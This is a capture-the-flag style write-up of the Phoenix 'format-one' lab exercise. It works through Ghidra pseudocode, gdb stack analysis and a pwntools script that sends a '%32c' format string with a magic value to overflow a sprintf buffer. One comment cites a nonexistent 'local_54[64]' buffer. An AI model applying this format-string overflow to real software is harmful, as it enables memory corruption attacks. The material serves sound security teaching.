# &#35; format-1

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  char *pcVar1;
  undefined *puVar2;
  undefined auStack80 [12];
  char local_44 [15];
  undefined local_35;
  undefined local_34 [32];
  int local_14;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/format-one, brought to you by https://exploit.education");
  pcVar1 = fgets(local_44,0xf,stdin);
  puVar2 = auStack80;
  if (pcVar1 == (char *)0x0) {
    errx();
    puVar2 = &stack0xffffffa0;
  }
  local_35 = 0;
  local_14 = 0;
  *(char **)(puVar2 + -0xc) = local_44;
  *(undefined **)(puVar2 + -0x10) = local_34;
  *(undefined4 *)(puVar2 + -0x14) = 0x80485cb;
  sprintf(*(char **)(puVar2 + -0x10),*(char **)(puVar2 + -0xc));
  if (local_14 == 0x45764f6c) {
    *(char **)(puVar2 + -0x10) = "Well done, the \'changeme\' variable has been changed correctly!";
    *(undefined4 *)(puVar2 + -0x14) = 0x80485fb;
    puts(*(char **)(puVar2 + -0x10));
  }
  else {
    *(int *)(puVar2 + -0xc) = local_14;
    *(char **)(puVar2 + -0x10) = "Uh oh, \'changeme\' is not the magic value, it is 0x%08x\n";
    *(undefined4 *)(puVar2 + -0x14) = 0x80485e9;
    printf(*(char **)(puVar2 + -0x10));
  }
  *(undefined4 *)(puVar2 + -0x10) = 0;
                    /* WARNING: Subroutine does not return */
  *(undefined4 *)(puVar2 + -0x14) = 0x8048608;
  exit(*(int *)(puVar2 + -0x10));
}


```

#### &#42; check binary
```bash
$ file /opt/phoenix/amd64/format-one
/opt/phoenix/amd64/format-one: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped

$ checksec /opt/phoenix/amd64/format-one
[*] '/opt/phoenix/amd64/format-one'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/x86_64-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/amd64/format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
aaaa
Uh oh, 'changeme' is not the magic value, it is 0x00000000

$ /opt/phoenix/amd64/format-one
Welcome to phoenix/format-one, brought to you by https://exploit.education
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Uh oh, 'changeme' is not the magic value, it is 0x00000000

```

#### &#42; vulnerable point
#### buffer overflow on sprintf()
```bash
#### we can overwrite local_14 variable using local_54[64]
```


#### &#42; stack structure
#### local_34[32] + local_14[4] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/format-one -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/format-one...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048565 <+0>:	lea    ecx,[esp+0x4]
   0x08048569 <+4>:	and    esp,0xfffffff0
   0x0804856c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804856f <+10>:	push   ebp
   0x08048570 <+11>:	mov    ebp,esp
   0x08048572 <+13>:	push   ecx
   0x08048573 <+14>:	sub    esp,0x44
   0x08048576 <+17>:	sub    esp,0xc
   0x08048579 <+20>:	push   0x8048650
   0x0804857e <+25>:	call   0x8048380 <puts@plt>
   0x08048583 <+30>:	add    esp,0x10
   0x08048586 <+33>:	mov    eax,ds:0x80498a0
   0x0804858b <+38>:	sub    esp,0x4
   0x0804858e <+41>:	push   eax
   0x0804858f <+42>:	push   0xf
   0x08048591 <+44>:	lea    eax,[ebp-0x3c]
   0x08048594 <+47>:	push   eax
   0x08048595 <+48>:	call   0x8048370 <fgets@plt>
   0x0804859a <+53>:	add    esp,0x10
   0x0804859d <+56>:	test   eax,eax
   0x0804859f <+58>:	jne    0x80485b0 <main+75>
   0x080485a1 <+60>:	sub    esp,0x8
   0x080485a4 <+63>:	push   0x804869b
   0x080485a9 <+68>:	push   0x1
   0x080485ab <+70>:	call   0x8048390 <errx@plt>
   0x080485b0 <+75>:	mov    BYTE PTR [ebp-0x2d],0x0    => local_35 = 0
   0x080485b4 <+79>:	mov    DWORD PTR [ebp-0xc],0x0    => local_14 = 0
   0x080485bb <+86>:	sub    esp,0x8
   0x080485be <+89>:	lea    eax,[ebp-0x3c]             => src(local_44)
   0x080485c1 <+92>:	push   eax
   0x080485c2 <+93>:	lea    eax,[ebp-0x2c]             => dst(local_34)
   0x080485c5 <+96>:	push   eax
   0x080485c6 <+97>:	call   0x80483a0 <sprintf@plt>
   0x080485cb <+102>:	add    esp,0x10
   0x080485ce <+105>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485d1 <+108>:	cmp    eax,0x45764f6c
   0x080485d6 <+113>:	je     0x80485ee <main+137>
   0x080485d8 <+115>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485db <+118>:	sub    esp,0x8
   0x080485de <+121>:	push   eax
   0x080485df <+122>:	push   0x80486b0
   0x080485e4 <+127>:	call   0x8048360 <printf@plt>
   0x080485e9 <+132>:	add    esp,0x10
   0x080485ec <+135>:	jmp    0x80485fe <main+153>
   0x080485ee <+137>:	sub    esp,0xc
   0x080485f1 <+140>:	push   0x80486e8
   0x080485f6 <+145>:	call   0x8048380 <puts@plt>
   0x080485fb <+150>:	add    esp,0x10
   0x080485fe <+153>:	sub    esp,0xc
   0x08048601 <+156>:	push   0x0
   0x08048603 <+158>:	call   0x80483b0 <exit@plt>
End of assembler dump.
gef>


gef> x/24xw $ebp-0x2c
0xffffd61c:	0x41414141	0x41414141	0x0a414141	0x00000000
0xffffd62c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd63c:	0x00000000	0x00000000	0xffffd660	0xffffd6dc
0xffffd64c:	0xf7f8f654	0xffffd6d4	0x00000001	0xffffd6dc
0xffffd65c:	0xf7f8f654	0x00000001	0xffffd6d4	0xffffd6dc
0xffffd66c:	0x00000008	0x00000011	0x00000000	0xf7f8f628

gef> x/4xw $ebp-0xc
0xffffd63c:	0x00000000	0x00000000	0xffffd660	0xffffd6dc

gef> p/d 0xffffd63c-0xffffd61c
$3 = 32
gef>

```

#### &#42; payload
```bash
## we can't normal overflow because input length is restricted
char local_44 [15];
pcVar1 = fgets(local_44,15,stdin);

## we can overflow using sprintf(buffer, [format string], src)
## local_34[32] + local_14[4] + sfp[4] + ret[4]
## $ebp-0x2c is buffer(local_34[32])
## $ebp-0xc is local_14
payload  = b""
payload += b"%32c"
payload += p32(0x45764f6c)

```

#### &#42; exploit
```bash
$ cat exp_format1.py
from pwn import *

context.arch='i386'
context.log_level='debug'

filename="/opt/phoenix/i486/format-one"
conn = process(filename)

payload  = b""
payload += b"%32c"
payload += p32(0x45764f6c)

print( conn.recvline() )
conn.sendline(payload)

conn.interactive()




$ python exp_format1.py
[+] Starting local process '/opt/phoenix/i486/format-one': pid 2040
[DEBUG] Received 0x4b bytes:
    'Welcome to phoenix/format-one, brought to you by https://exploit.education\n'
Welcome to phoenix/format-one, brought to you by https://exploit.education

[DEBUG] Sent 0x9 bytes:
    '%32clOvE\n'
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/format-one' stopped with exit code 0 (pid 2040)
[DEBUG] Received 0x3f bytes:
    "Well done, the 'changeme' variable has been changed correctly!\n"
Well done, the 'changeme' variable has been changed correctly!
[*] Got EOF while reading in interactive
$

```


